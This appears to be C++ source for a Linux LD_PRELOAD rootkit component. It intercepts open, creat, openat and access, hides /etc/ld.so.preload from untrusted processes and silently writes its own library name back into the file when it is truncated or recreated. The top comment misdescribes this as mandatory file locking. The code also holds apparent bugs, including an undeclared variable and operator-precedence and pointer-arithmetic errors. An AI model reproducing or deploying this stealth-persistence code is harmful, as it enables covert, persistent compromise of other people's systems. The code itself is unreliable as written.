
#include <main.h>

//
// Linux maintain mandatory lock for file with
// guid enable bit and goup execute disabled.
//



int open(const char *pathname, int flags, mode_t mode) {
	CErrnoSaver serr;
	OPEN opnPtr = (OPEN)dlsym (RTLD_NEXT, "open");
	READ rdPtr = (READ)dlsym (RTLD_NEXT, "read");
	PWRITE pwrPtr = (PWRITE)dlsym (RTLD_NEXT, "pwrite");
	std::string file (pathname);
	char chArr[2], *chPtr;
	
	
	assert (opnPtr != NULL);
	assert (rdPtr != NULL);
	assert (pwrPtr != NULL);
	
	// To check if the caller is our trust process
	if ((chPtr = getenv (envShowName)) && !strcmp (chPtr, envShowFile)) {
		return opnPtr (pathname, flags, mode);
	}
	
	file = getClearName (file);
	
	// Is the ld.so.preload opening ?
	if (!strcmp (prelFileNameClear, file.c_str ())) {
		descr_holder fd (new int (-1));
		*fd = opnPtr (dynCnfFile.c_str (), O_RDWR, 0);
		lockAllFile (*fd);
		
		while ((ind = rdPtr (*fd, chArr, 2)) == -1 && errno == EINTR);
		
		// we can't read dynamic_cnf.txt, at default we think that this file hasn't exist
		if (-1 == ind) {
			if (flags & O_CREAT) return opnPtr (pathname, flags & (~O_TRUNC), mode);
			else {
				serr.set (ENOENT);
				return -1;
			}
		}
		// the file doesn't exist
		if (chArr[0] == not_created) {
			if (!flags & O_CREAT) {
				serr.set (ENOENT);
				return -1;
			}
			else {
				int ret = opnPtr (pathname, flags & (~O_TRUNC), mode);
				if (ret != -1) while (pwrite (*fd, &created, 1, 0) == -1 && errno == EINTR);
				return ret;
			}
		}
		// the file created
		if (flags & O_TRUNC) {
			struct stat buf;
			int ret = opnPtr (pathname, O_RDWR | O_TRUNC, 0);
			if (ret == -1) {
				serr.set (errno);
				return ret;
			}
			
			while (pwrPtr (ret,
						   hookLibraryName.c_str () + ' ',
						   hookLibraryName.size (),
						   0
				  ) == -1 && errno == EINTR
			);
			while (pwrPtr (*fd,
						   (std::string (created) + not_writed).c_str (),
						   (std::string (created) + not_writed).size (),
						   0
				  ) == -1 && errno == EINTR
			);
			
			close (ret);
			return opnPtr (pathname, flags & (~O_TRUNC), mode);
		}
		// the file have created and we wan't to overwrite it
		return opnPtr (pathname, flags, mode);
	}
	
	// this file isn't intersted for us
	return opnPtr (pathname, flags, mode);
}

int creat(const char *pathname, mode_t mode) { // O_CREATE | O_TRUNC | O_WRONLY
	CErrnoSaver serr;
	OPEN opnPtr = (OPEN)dlsym (RTLD_NEXT, "open");
	CREAT crtPtr = (CREAT)dlsym (RTLD_NEXT, "creat");
	PWRITE pwrPtr = (PWRITE)dlsym (RTLD_NEXT, "pwrite");
	std::string file (pathname);
	char *chPtr;
	
	
	assert (opnPtr != NULL);
	assert (pwrPtr != NULL);
	assert (crtPtr != NULL);
	
	if ((chPtr = getenv (envShowName)) && !strcmp (chPtr, envShowFile)) {
		return crtPtr (pathname, mode);
	}
	
	file = getClearName (file);
	
	if (!strcmp (prelFileNameClear, file.c_str ())) {
		descr_holder fd (new int (-1));
		*fd = opnPtr (dynCnfFile.c_str (), O_RDWR);
		lockAllFile (*fd);
		
		int ret = crtPtr (pathname, mode);
		if (ret == -1) {
			serr.set (errno);
			return ret;
		}
		while (pwrPtr (ret,
					   (hookLibraryName + ' ').c_str (),
					   (hookLibraryName + ' ').size (),
					   0
			  ) == -1 && errno == EINTR
		);
		while (pwrPtr (*fd,
					   (std::string (created) + not_writed).c_str (),
					   (std::string (created) + not_writed).size (),
					   0
			  ) == -1 && errno == EINTR
		);
		return ret;
	}
	
	
	return crtPtr (pathname, mode);
}

int openat(int dirfd, const char *pathname, int flags, mode_t mode) {
	CErrnoSaver serr;
	OPENAT opnAtPtr = (OPENAT)dlsym (RTLD_NEXT, "openat");
	OPENAT opnPtr = (OPENAT)dlsym (RTLD_NEXT, "open");
	READ rdPtr = (READ)dlsym (RTLD_NEXT, "read");
	PWRITE pwrPtr = (PWRITE)dlsym (RTLD_NEXT, "pwrite");
	std::string file (pathname);
	char chArr[2], *chPtr;
	
	
	assert (opnAtPtr != NULL);
	assert (opnPtr != NULL);
	assert (rdPtr != NULL);
	assert (pwrPtr != NULL);
	
	if ((chPtr = getenv (envShowName)) && !strcmp (chPtr, envShowFile)) {
		return opnAtPtr (dirfd, pathname, flags, mode);
	}
	
	file = getClearName (file);
	
	// Is the ld.so.preload opening ?
	if (!strcmp (prelFileNameClear, file.c_str ())) {
		descr_holder fd (new int (-1));
		*fd = opnPtr (dynCnfFile.c_str (), O_RDWR, 0);
		lockAllFile (*fd);
		
		while ((ind = rdPtr (*fd, chArr, 2)) == -1 && errno == EINTR);
		
		// we can't read dynamic_cnf.txt, at default we think that this file hasn't exist
		if (-1 == ind) {
			if (flags & O_CREAT) return opnAtPtr (dirfd, pathname, flags & (~O_TRUNC), mode);
			else {
				serr.set (ENOENT);
				return -1;
			}
		}
		// the file doesn't exist
		if (chArr[0] == not_created) {
			if (!flags & O_CREAT) {
				serr.set (ENOENT);
				return -1;
			} else {
				int ret = opnAtPtr (dirfd, pathname, flags & (~O_TRUNC), mode);
				if (ret != -1) {
					while (pwrite (*fd, &created, 1, 0) == -1 && errno == EINTR);
					return ret;
				} else {
					serr.set (errno);
					return ret;
				}
			}
		}
		// the file exists
		if (flags & O_TRUNC) {
			int ret = opnAtPtr (dirfd, pathname, O_RDWR | O_TRUNC, 0);
			if (ret == -1) {
				serr.set (errno);
				return ret;
			}
			
			while (pwrPtr (ret,
						   (hookLibraryName + ' ').c_str (),
						   (hookLibraryName + ' ').size (),
						   0
				  ) == -1 && errno == EINTR
			);
			while (pwrPtr (*fd,
						   (std::string (created) + not_writed).c_str (),
						   (std::string (created) + not_writed).size (),
						   0
				  ) == -1 && errno == EINTR
			);
			
			close (ret);
			return opnAtPtr (dirfd, pathname, flags & (~O_TRUNC), mode);
		}
		// the file have created and we wan't to overwrite it
		return opnAtPtr (dirfd, pathname, flags, mode);
	}
	
	// this file isn't intersted for us
	return opnAtPtr (dirfd, pathname, flags, mode);
}

int access(const char *pathname, int mode) {
	CErrnoSaver serr;
	OPEN opnPtr = (OPEN)dlsym (RTLD_NEXT, "open");
	READ rdPtr = (READ)dlsym (RTLD_NEXT, "read");
	ACCESS acsPtr = (ACCESS) dlsym (RTLD_NEXT, "access");
	std::string fileName (pathname);
	size_t ind;
	char chArr[2], *chPtr;
	
	
	assert (acsPtr != NULL);
	assert (opnPtr != NULL);
	assert (rdPtr != NULL);
	
	// To check if the caller is our trust process
	if ((chPtr = getenv (envShowName)) && !strcmp (chPtr, envShowFile)) {
		return acsPtr (pathname, mode);
	}
	
	fileName = getClearName (fileName);
	if (!strcmp (fileName.c_str (), prelFileNameClear)) {
		descr_holder fd (new int (-1));
		*fd = opnPtr (dynCnfFile.c_str (), O_RDWR, 0);
		lockAllFile (*fd);
		
		while ((ind = rdPtr (*fd, chArr, 2)) == -1 && errno == EINTR);
		if (ind == -1) {
			serr.set (ENOENT);
			return -1;
		}
		if (chArr[0] == created) return acsPtr (pathname, mode);
		else {
			serr.set (ENOENT);
			return -1;
		}
	}
	
	
	return acsPtr (pathname, mode);
}













